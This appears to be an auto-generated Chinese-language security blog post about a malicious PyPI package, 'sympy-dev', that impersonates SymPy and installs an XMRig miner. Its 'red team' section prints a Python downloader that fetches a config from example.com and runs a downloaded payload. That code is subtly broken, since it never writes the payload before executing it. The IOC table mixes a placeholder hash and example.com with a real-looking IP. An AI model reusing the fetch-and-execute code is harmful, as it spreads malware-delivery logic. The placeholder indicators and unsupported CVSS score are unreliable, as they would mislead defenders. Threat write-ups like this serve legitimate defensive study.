---
layout: post
title:  "Malicious PyPI Package Impersonates SymPy, Deploys XMRig Miner on Linux Hosts"
date:   2026-01-22 12:34:55 +0000
categories: [security]
severity: critical
---

# 🚨 解析 PyPI 惡意套件：SymPy-dev 的隱藏威脅
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `XMRig`, `memfd_create`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意套件 `sympy-dev` 模仿了 SymPy 的項目描述，嘗試欺騙用戶下載一個「開發版本」的庫。這個套件實際上是一個下載器，會下載並執行一個 XMRig 密碼幣挖礦程式。
* **攻擊流程圖解**:
  1. 用戶下載並安裝 `sympy-dev` 套件。
  2. 當特定的多項式函數被呼叫時，會觸發惡意行為。
  3. 惡意程式會下載一個遠程 JSON 配置檔案。
  4. 惡意程式會下載並執行一個 ELF Payload。
* **受影響元件**: SymPy 的使用者，特別是那些使用 Linux 系統的開發人員。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要用戶安裝 `sympy-dev` 套件。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    import os
    
    # 下載遠程 JSON 配置檔案
    config_url = "https://example.com/config.json"
    config_response = requests.get(config_url)
    config_data = config_response.json()
    
    # 下載 ELF Payload
    payload_url = config_data["payload_url"]
    payload_response = requests.get(payload_url)
    payload_data = payload_response.content
    
    # 執行 ELF Payload
    os.system("chmod +x payload")
    os.system("./payload")
    
    ```
* **繞過技術**: 惡意程式使用 `memfd_create` 和 `/proc/self/fd` 來執行 ELF Payload，避免留下磁碟上的痕跡。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `63.250.56.54` | `example.com` | `/tmp/payload` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule sympy_dev_malware {
      meta:
        description = "Detects sympy-dev malware"
      strings:
        $a = "sympy-dev"
        $b = "XMRig"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 刪除 `sympy-dev` 套件，更新 SymPy 套件到最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **XMRig**: 一種用於挖掘 Monero 密碼幣的軟體。
* **memfd_create**: 一個 Linux 系統調用，用于創建一個匿名的內存檔案描述符。
* **eBPF**: 一種 Linux 系統的內核HOOK機制，允許用戶空間程式碼注入到內核中。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/malicious-pypi-package-impersonates.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


